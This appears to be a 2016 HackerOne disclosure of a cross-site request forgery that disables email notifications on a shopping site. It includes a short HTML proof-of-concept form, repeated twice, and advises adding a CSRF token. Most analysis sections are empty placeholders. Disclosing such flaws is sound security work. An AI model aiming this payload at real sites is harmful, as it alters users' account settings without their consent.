# CSRF To change Email Notification Settings 

## Metadata
- **Source:** HackerOne
- **Report:** 157956 | https://hackerone.com/reports/157956
- **Submitted:** 2016-08-09
- **Reporter:** trad_zero_h
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hi i found CSRF To change Email Notification Settings 

The Code Of the HTML Page ::
<html>
  <body>
    <form action="https://www.instacart.com/api/v2/email_settings/76/disable?resource_token=">
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>

For Fixing you Must add CSEF Token to the Request 

i attached Video Showing the Bug 

Thanks  


## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi i found CSRF To change Email Notification Settings 

The Code Of the HTML Page ::
<html>
  <body>
    <form action="https://www.instacart.com/api/v2/email_settings/76/disable?resource_token=">
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>

For Fixing you Must add CSEF Token to the Request 

i attached Video Showing the Bug 

Thanks  


</details>

---
*Analysed by Claude on 2026-05-24*
